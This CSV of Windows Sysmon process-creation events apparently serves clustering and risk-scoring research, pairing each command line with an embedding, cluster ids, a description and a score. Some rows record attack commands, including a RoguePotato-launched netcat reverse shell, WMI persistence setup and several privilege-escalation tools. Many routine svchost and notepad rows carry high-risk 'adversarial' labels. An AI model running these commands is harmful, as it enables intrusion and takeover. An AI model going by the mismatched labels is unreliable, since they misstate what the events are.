2019-06-14T22:22:32.222745Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"" /stext ""C:\Users\IEUser\AppData\Local\Temp\tmpA185.tmp""",[0.00695579 0.01377005 0.00668399 ... 0.01785152 0.00237354 0.0177048 ],70,139,Likely credential harvesting activity using renamed NirSoft utilities masquerading as the .NET compiler (vbc.exe) to export data to temporary files.,8
2019-06-14T22:22:55.441495Z,IEWIN7,Microsoft-Windows-Sysmon,1,\SystemRoot\System32\smss.exe 00000000 00000040 ,"[-0.01118363  0.01723135  0.0184486  ...  0.02312799 -0.0189116
  0.00234878]",31,54,Routine execution of the Windows Session Manager Subsystem (smss.exe) for session initialization and management.,1
2019-06-14T22:23:06.691495Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E},[0.00742013 0.02741505 0.01925472 ... 0.01917664 0.00197596 0.0067573 ],44,50,Standard Windows COM+ Surrogate (DllHost.exe) processes hosting various system COM components identified by their Class IDs.,1
2019-06-14T22:23:07.019620Z,IEWIN7,Microsoft-Windows-Sysmon,1,efsui.exe /efs /keybackup,"[-0.02294185  0.00986347  0.03257212 ... -0.00328856  0.00377964
 -0.00963229]",118,140,"Local privilege escalation attempt using the EfsPotato exploit targeting the EFS service, combined with EFS key backup activity.",10
2019-06-14T22:23:13.957120Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe""","[ 0.02462442  0.02166824  0.02080225 ...  0.02326598 -0.00318184
 -0.01140102]",93,121,"Execution of suspicious executables with randomized filenames from AppData Roaming and Local Temp directories, indicative of potential malware or dropper activity.",9
2019-06-14T22:23:15.054777Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\VBoxTray.exe"" ","[ 0.01417899  0.01052258  0.01566595 ...  0.01090392  0.00453278
 -0.00871694]",0,160,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-06-14T22:23:23.405362Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\eventvwr.exe"" ","[-0.01528447  0.02837988  0.01656376 ...  0.01537156 -0.00082604
 -0.01162944]",0,91,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-06-14T22:23:26.999112Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"" /stext ""C:\Users\IEUser\AppData\Local\Temp\tmp7792.tmp""","[ 0.01405686  0.01490484  0.01300014 ...  0.01425431 -0.00242441
  0.01445406]",70,139,Likely credential harvesting activity using renamed NirSoft utilities masquerading as the .NET compiler (vbc.exe) to export data to temporary files.,8
2019-05-13T18:02:49.160591Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\System32\mobsync.exe -Embedding,"[ 0.00456527  0.0192133   0.02656596 ...  0.00514545  0.00061836
 -0.00706506]",111,26,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2019-05-13T18:03:19.681478Z,IEWIN7,Microsoft-Windows-Sysmon,1,/c notepad.exe,"[-0.00233625  0.02601867  0.0076369  ...  0.00207378  0.00833713
  0.00593748]",0,15,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-11T17:57:49.903159Z,IEWIN7,Microsoft-Windows-Sysmon,1,python  winpwnage.py -u elevate -5 -p c:\Windows\System32\cmd.exe,"[ 0.00207101  0.02550012  0.02424202 ... -0.00070545 -0.01242939
  0.00185077]",48,233,Multiple execution attempts of winpwnage.py targeting UAC bypass and privilege escalation to launch command shells and arbitrary DLLs.,9
2019-05-11T17:58:22.809409Z,IEWIN7,Microsoft-Windows-Sysmon,1,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,"[ 0.00129287  0.0260889   0.02264138 ...  0.00346485 -0.00902617
  0.00138364]",48,233,Multiple execution attempts of winpwnage.py targeting UAC bypass and privilege escalation to launch command shells and arbitrary DLLs.,9
2019-05-11T17:58:23.215659Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH CommandLineEventConsumer CREATE Name=""BotConsumer23"", ExecutablePath=""c:\Windows\System32\cmd.exe"", CommandLineTemplate=""c:\Windows\System32\cmd.exe""","[-0.00815181  0.02448718  0.01916432 ... -0.00028608 -0.00596211
  0.00189944]",71,33,"Creation and deletion of WMI Event Subscriptions for persistence, utilizing CommandLineEventConsumer and __EventFilter to trigger cmd.exe.",9
2019-05-11T17:58:23.450034Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=""BotFilter82""', Consumer='CommandLineEventConsumer.Name=""BotConsumer23""'","[-0.00373731  0.01973823  0.01084271 ... -0.00417459 -0.00137935
 -0.00312952]",71,33,"Creation and deletion of WMI Event Subscriptions for persistence, utilizing CommandLineEventConsumer and __EventFilter to trigger cmd.exe.",9
2019-05-11T17:58:23.590659Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __EventFilter CREATE Name=""BotFilter82"", EventNameSpace=""root\cimv2"", QueryLanguage=""WQL"", Query=""SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""","[-0.0110087   0.0150702   0.02521036 ...  0.00794113 -0.00131471
 -0.00661365]",71,33,"Creation and deletion of WMI Event Subscriptions for persistence, utilizing CommandLineEventConsumer and __EventFilter to trigger cmd.exe.",9
2019-05-11T17:58:50.090659Z,IEWIN7,Microsoft-Windows-Sysmon,1,c:\Windows\System32\cmd.exe,"[-0.00120621  0.03603672  0.01823867 ...  0.01496916 -0.00935595
  0.00755281]",0,30,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-11T17:58:54.887534Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH CommandLineEventConsumer WHERE Name=""BotConsumer23"" DELETE","[-0.01015491  0.02073983 -0.00095973 ...  0.00784047  0.00258495
  0.0031925 ]",71,265,"Creation and deletion of WMI Event Subscriptions for persistence, utilizing CommandLineEventConsumer and __EventFilter to trigger cmd.exe.",9
2019-05-11T17:58:55.028159Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __EventFilter WHERE Name=""BotFilter82"" DELETE","[-0.01856614  0.01979219  0.00511717 ...  0.00427564 -0.00037618
 -0.00425622]",71,265,"Creation and deletion of WMI Event Subscriptions for persistence, utilizing CommandLineEventConsumer and __EventFilter to trigger cmd.exe.",9
2019-05-11T17:58:55.153159Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=""BotFilter82""' DELETE","[-1.2717930e-02  1.9458389e-02 -1.1750533e-03 ... -8.0809420e-05
  1.2077783e-03 -8.6998420e-04]",71,265,"Creation and deletion of WMI Event Subscriptions for persistence, utilizing CommandLineEventConsumer and __EventFilter to trigger cmd.exe.",9
2019-04-03T18:11:54.098352Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Users\user01\Desktop\WMIGhost.exe"" ","[ 0.00413808 -0.00400308  0.01379859 ...  0.01191033 -0.00303727
 -0.00513165]",111,121,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2019-04-03T18:12:00.016862Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,C:\Windows\system32\wbem\scrcons.exe -Embedding,"[-0.00126755  0.00902845  0.0045204  ...  0.00923557  0.00370118
  0.00429377]",0,20,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2021-08-22T19:33:38.725718Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,c:\temp\EfsPotato.exe  whoami,"[-0.01279782  0.03570216  0.0106939  ...  0.00623517 -0.00809789
 -0.01357012]",118,243,"Local privilege escalation attempt using the EfsPotato exploit targeting the EFS service, combined with EFS key backup activity.",10
2021-08-22T19:33:52.250240Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,"""C:\Users\bouss\AppData\Local\Microsoft\OneDrive\21.139.0711.0001\FileCoAuth.exe"" -Embedding","[ 0.01271065  0.01310037  0.00675302 ... -0.00060138  0.0052454
  0.00422739]",72,175,Standard Microsoft OneDrive File Co-Authoring process executions initiated via COM embedding.,1
2020-10-01T18:35:02.415351Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,POC.exe,"[ 0.01974034  0.01238187  0.02089175 ...  0.02152123 -0.00733742
  0.00115596]",106,104,Execution of suspicious binaries including proof-of-concept tools and payload-loading wrappers indicating exploit development or active compromise.,9
2020-10-01T18:35:02.606952Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,Program,"[ 0.0102631  -0.01077843  0.02138884 ...  0.00909248  0.00696576
 -0.00184575]",120,153,"This cluster indicates high-risk activity including system discovery, potential privilege escalation via Utility Manager, living-off-the-land execution with MSBuild, and explicit EDR alerts for renamed signed binary proxies and driver loading.",9
2020-05-10T00:09:36.635333Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"NetworkServiceExploit.exe  -i -c ""c:\Windows\System32\cmd.exe""","[-0.00387113  0.03750197  0.00312518 ...  0.00512617 -0.02092569
  0.00523306]",94,233,Execution of known privilege escalation tools targeting service accounts to obtain SYSTEM level access.,10
2020-05-11T23:21:56.493742Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"RoguePotato.exe  -r 10.0.2.11 -e ""c:\Users\IEUser\tools\misc\nc64.exe 10.0.2.11 3001 -e cmd.exe"" -l 9999","[ 0.00659346  0.03209872  0.00755175 ... -0.00575096 -0.01001865
 -0.00565822]",73,146,Local privilege escalation via RoguePotato combined with a Netcat reverse shell for remote command execution.,10
2020-05-11T23:21:56.587063Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,c:\Users\IEUser\tools\misc\nc64.exe 10.0.2.11 3001 -e cmd.exe,"[ 0.0048409   0.0348057   0.0079297  ...  0.001745   -0.00883685
 -0.00046938]",73,146,Local privilege escalation via RoguePotato combined with a Netcat reverse shell for remote command execution.,10
2019-05-26T15:47:56.667118Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\System32\notepad.exe,[0.00383098 0.02166852 0.01443601 ... 0.01753752 0.00275153 0.00733024],0,61,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-26T15:48:00.752994Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\notepad.exe""",[0.00262705 0.02065851 0.01686119 ... 0.01320936 0.00219776 0.00501171],0,61,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-05-02T18:01:54.855306Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,PrintSpoofer.exe  -i -c powershell.exe,"[-0.00313814  0.01074943  0.02990821 ...  0.01194187  0.00167662
  0.00715836]",113,261,Privilege escalation attempts leveraging Print Spooler exploits and service impersonation techniques to gain SYSTEM authority.,9
2020-05-02T18:01:54.867394Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,powershell.exe,"[ 0.00332066  0.00798216  0.01814611 ...  0.01042555  0.00578187
 -0.00225499]",0,170,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-05-02T18:01:57.418442Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\whoami.exe""","[-0.01140274  0.0248795   0.00557955 ...  0.01480965 -0.00597714
 -0.00468739]",0,60,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2022-02-19T17:35:16.207004Z,DESKTOP-TTEQ6PR,Microsoft-Windows-Sysmon,1,"""C:\Users\win10\Desktop\SpoolFool-main\SpoolFool.exe"" -dll C:\ProgramData\Test.dll","[ 0.00186986 -0.00068944  0.03324776 ...  0.01048215 -0.00850224
  0.0012019 ]",113,254,Privilege escalation attempts leveraging Print Spooler exploits and service impersonation techniques to gain SYSTEM authority.,9
2020-08-12T13:05:20.029483Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\SYSTEM32\cmd.exe /c """"C:\Program Files\Npcap\CheckStatus.bat""""","[ 0.00374978  0.02833784  0.00924725 ...  0.01255382 -0.01056904
 -0.0132584 ]",95,252,Routine verification and status checks for the Npcap packet capture library.,2
2020-08-12T13:05:38.260138Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\system32\cmd.exe /c reg query ""HKLM\Software\WOW6432Node\Npcap"" /ve 2>nul | find ""REG_SZ""","[-0.01806994  0.01033021  0.00668278 ...  0.01561995 -0.0233737
 -0.00066424]",95,208,Routine verification and status checks for the Npcap packet capture library.,2
2020-08-12T13:06:00.737148Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\cmd.exe /c rmdir /s/q C:\ProgramData\Microsoft\Windows\WER\ReportQueue\a_b_c_d_e > nul 2>&1,"[-0.00364786  0.03871973  0.02438428 ...  0.01583815 -0.0130891
 -0.00747465]",74,119,Manual manipulation of Windows Error Reporting (WER) directories and report files using silent execution and command delimiter obfuscation.,5
2020-08-12T13:06:01.637860Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\system32\cmd.exe /c mkdir,C:\ProgramData\Microsoft\Windows\WER\ReportQueue\a_b_c_d_e","[ 0.0049137   0.03982196  0.02864219 ...  0.00521881 -0.01268773
  0.00232416]",74,119,Manual manipulation of Windows Error Reporting (WER) directories and report files using silent execution and command delimiter obfuscation.,5
2020-08-12T13:06:02.552084Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\cmd.exe /c copy Report.wer C:\ProgramData\Microsoft\Windows\WER\ReportQueue\a_b_c_d_e > nul 2>&1,"[ 0.00413874  0.04129226  0.045238   ...  0.02341256 -0.00515652
 -0.01429877]",74,119,Manual manipulation of Windows Error Reporting (WER) directories and report files using silent execution and command delimiter obfuscation.,5
2020-08-12T13:06:03.487498Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\system32\cmd.exe /c schtasks /run /TN ""Microsoft\Windows\Windows Error Reporting\QueueReporting"" > nul 2>&1","[-0.01211721  0.02894169  0.00044506 ...  0.01728766  0.01228419
 -0.01378363]",105,119,Manipulation and execution of native Windows telemetry and error reporting scheduled tasks.,4
2020-11-26T10:44:49.642770Z,02694w-win10.threebeesco.com,Microsoft-Windows-Sysmon,1,pocacct.exe  payload.dll,"[ 0.0062876   0.01486528  0.02031685 ...  0.02402755  0.01348221
 -0.00505615]",106,104,Execution of suspicious binaries including proof-of-concept tools and payload-loading wrappers indicating exploit development or active compromise.,9
2020-11-26T10:45:14.007362Z,02694w-win10.threebeesco.com,Microsoft-Windows-Sysmon,1,C:\WINDOWS\System32\spoolsv.exe,"[ 0.00678365  0.02021459  0.01706285 ...  0.02565756 -0.00793928
  0.00312176]",64,186,Execution of the standard Windows Print Spooler service executable.,1
2020-04-25T22:19:00.308479Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""LogonUI.exe"" /flags:0x4 /state0:0xa38bd055 /state1:0x41c64e6d","[-0.01601522  0.00140001  0.00870244 ... -0.00219863 -0.0072838
 -0.0014838 ]",33,58,Standard Windows Logon User Interface processes managing session state transitions and credential entry screens.,1
2020-04-25T22:19:20.134560Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,\SystemRoot\System32\smss.exe,"[-0.00511013  0.02452273  0.01462513 ...  0.02388718 -0.01176672
  0.00185   ]",31,54,Routine execution of the Windows Session Manager Subsystem (smss.exe) for session initialization and management.,1
2020-04-25T22:19:22.312741Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,\??\C:\Windows\system32\autochk.exe *,[0.00160705 0.01972095 0.02362858 ... 0.01999794 0.00313318 0.00348199],97,30,Native Windows diagnostic and system maintenance binaries typically associated with standard background OS activity.,3
2020-04-25T22:19:22.596352Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,\SystemRoot\System32\smss.exe 000000cc 00000084 ,"[-0.01235935  0.02352287  0.00521215 ...  0.02244522 -0.02402559
 -0.00131031]",31,54,Routine execution of the Windows Session Manager Subsystem (smss.exe) for session initialization and management.,1
2020-04-25T22:19:22.630819Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","[ 0.00990982  0.01612643  0.02349777 ...  0.03738876 -0.00209172
  0.0052459 ]",32,165,Legitimate system initialization of the Client/Server Runtime Subsystem (csrss.exe) with standard subsystem DLLs and heap configurations.,0
2020-04-25T22:19:23.220481Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,\SystemRoot\System32\smss.exe 000000d8 00000084 ,"[-0.00863032  0.01460936  0.01137916 ...  0.02687245 -0.02160438
  0.00500465]",31,54,Routine execution of the Windows Session Manager Subsystem (smss.exe) for session initialization and management.,1
2020-04-25T22:19:24.188398Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k DcomLaunch -p -s PlugPlay,"[ 0.01210236  0.01825551  0.01789083 ...  0.02801666 -0.00772246
 -0.00935772]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:24.194413Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k DcomLaunch -p,"[ 0.00978143  0.03356699  0.01568089 ...  0.02033282 -0.00560171
 -0.00513059]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:25.198770Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""LogonUI.exe"" /flags:0x2 /state0:0xa3b08855 /state1:0x41c64e6d","[-0.0146739   0.00595791  0.00695963 ... -0.00053329 -0.00510162
 -0.00391481]",33,58,Standard Windows Logon User Interface processes managing session state transitions and credential entry screens.,1
2020-04-25T22:19:25.211506Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""dwm.exe""","[-0.00351196  0.01132383  0.00414966 ...  0.01990388 -0.00229568
 -0.00380455]",34,77,Standard execution of Windows system host processes and window management services typically associated with scheduled tasks or system startup.,2
2020-04-25T22:19:25.418816Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p,"[ 0.00211469  0.03270047  0.01776714 ...  0.02472297 -0.00539495
 -0.00221472]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:25.432119Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,"[ 0.00060171  0.02679122  0.01235557 ...  0.02364636  0.00744215
 -0.00239372]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:25.482737Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s ProfSvc,"[ 5.1304833e-03  3.6691163e-02  1.8202106e-02 ...  3.2536183e-02
 -2.9869360e-05 -1.1127397e-03]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:25.485345Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog,"[-0.006567    0.02874255  0.01207713 ...  0.02432068  0.00498626
 -0.0042531 ]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:25.487154Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s UserManager,"[ 0.00251169  0.01876518  0.02216618 ...  0.0177343  -0.00467134
 -0.00567239]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:25.600572Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalService -p -s nsi,"[ 0.01091322  0.01885952  0.01325335 ...  0.0322763  -0.01105778
 -0.00635709]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:25.603617Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s Dhcp,"[ 0.00073297  0.0313161   0.00473701 ...  0.03317386 -0.0076899
 -0.00129928]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.158042Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\Upfc.exe /launchtype boot /cv pVnjz5d3jkOKEwXZiJ9/ng.0,"[-0.00697391  0.00893845  0.03123533 ...  0.02224382 -0.00827803
 -0.00048926]",111,63,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2020-04-25T22:19:26.303168Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k NetworkService -p -s NlaSvc,"[-0.0055863   0.03293719 -0.00210034 ...  0.02894167 -0.0011579
  0.00450677]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.507599Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k NetworkService -p -s Dnscache,[0.00225723 0.03914697 0.00335182 ... 0.03198112 0.00201824 0.01173638],0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.536826Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalService -p -s EventSystem,"[-0.00296919  0.02791134  0.01835149 ...  0.0203691   0.00641107
 -0.0074762 ]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.540338Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain,"[-0.00805396  0.03754283  0.02898643 ...  0.02039218 -0.00454806
 -0.00441612]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.542109Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k netsvcs -p -s Themes,"[-0.00028155  0.02833592  0.01725257 ...  0.03170974  0.00149801
 -0.00490175]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.558091Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k LocalService -p -s netprofm,"[ 0.00084854  0.03153947  0.02319575 ...  0.03666061 -0.01207909
 -0.00346736]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.632683Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s SENS,"[-0.00348205  0.03721877  0.00442059 ...  0.02045486 -0.01125214
 -0.00129928]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.635281Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\dxgiadaptercache.exe,"[-0.00504182  0.02319004 -0.00238234 ...  0.01493707  0.00810689
  0.00112603]",97,132,Native Windows diagnostic and system maintenance binaries typically associated with standard background OS activity.,3
2020-04-25T22:19:26.642035Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalService -p -s FontCache,"[-0.00116823  0.02103868  0.01139159 ...  0.02747751  0.00301217
  0.00770873]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.643837Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s AudioEndpointBuilder,"[-0.00999171  0.01358237  0.01656263 ...  0.01419502 -0.01089141
 -0.00954959]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.645870Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s WinHttpAutoProxySvc,"[ 0.00114972  0.03467993  0.02400697 ...  0.02876389 -0.00330922
 -0.01274025]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:26.652690Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,"[-0.00102059  0.02873255  0.02133255 ...  0.02464526 -0.00951143
  0.00184341]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:27.196616Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p,"[-0.00041677  0.03014887  0.02259857 ...  0.02417694 -0.00825126
  0.00170019]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:27.473253Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p,"[ 0.0060191   0.02958033  0.02974785 ...  0.02333575 -0.00979348
 -0.00247772]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:27.484186Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k netsvcs -p -s ShellHWDetection,"[-0.00270419  0.02038441  0.0108609  ...  0.01990358 -0.00726865
 -0.00857267]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:27.583529Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s Winmgmt,"[ 0.00634375  0.02443669  0.01297159 ...  0.02729287 -0.003265
 -0.00308034]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:27.764785Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k NetworkService -p -s LanmanWorkstation,"[-0.00274052  0.02835294  0.0064473  ...  0.03290801 -0.00193336
  0.00546562]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:27.836618Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\svchost.exe -k NetSvcs -p -s iphlpsvc,"[ 0.00232614  0.02789757  0.01084808 ...  0.03362377 -0.00166873
  0.00224126]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-04-25T22:19:27.838641Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted -p -s PolicyAgent,"[-0.01546998  0.03875429  0.01995491 ...  0.01809093 -0.00990627
 -0.00217723]",0,215,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
